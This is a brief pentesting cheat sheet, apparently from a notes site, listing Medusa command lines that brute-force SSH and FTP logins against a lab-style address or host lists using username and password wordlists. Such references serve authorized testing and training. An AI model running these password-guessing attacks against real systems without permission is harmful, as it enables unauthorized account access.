!!! info ""

    ## Medusa

    ```shell
    medusa -u root -P 500-worst-passwords.txt -h 10.10.10.10 -M ssh
    medusa -h 10.10.10.10 -u root -P pass.txt -M ftp
    medusa -H hosts.txt -U user.txt -P pass.txt -M ftp
    medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -T 1
    medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -T 2
    medusa -h 10.10.10.10 -U user.txt -P pass.txt -M ssh
    medusa -h 10.10.10.10 -U user.txt -P pass.txt -M ssh -n 2222
    medusa -h 10.10.10.10 -U user.txt -P pass.txt -M ftp -O log.txt
    ```
